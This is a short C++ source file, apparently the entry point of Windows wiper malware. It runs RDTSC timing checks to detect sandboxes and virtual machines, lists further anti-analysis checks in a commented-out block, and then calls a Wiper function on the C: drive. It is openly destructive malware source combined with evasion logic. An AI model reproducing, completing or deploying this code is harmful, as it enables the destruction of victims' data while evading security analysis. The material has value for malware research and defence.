#pragma once
#include <Windows.h>
#include <strsafe.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include "wiper.h"
#include "evasion.h"

LARGE_INTEGER filesize;
TCHAR szDir[MAX_PATH];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine,int nShowCmd) {

	BOOL rdtDiffLocky = rdtsc_diff_locky();
	BOOL rdtDiffVmexit = rdtsc_diff_vmexit();
	if (rdtDiffLocky || rdtDiffVmexit) exit(0);
	/*loaded_dlls();
	TCHAR* user = get_username();
	known_usernames();
	TCHAR* nbHost = get_netbios_hostname();
	TCHAR* dnsHost = get_dns_hostname();
	known_hostnames();
	other_known_sandbox_environment_checks();
	NumberOfProcessors();
	str_trick();
	lack_user_input();
	mouse_movement();
	memory_space();
	disk_size_getdiskfreespace();
	cpuid_is_hypervisor();
	accelerated_sleep();
	BOOL diskEnum = registry_disk_enum();*/

	Wiper(L"c:");
}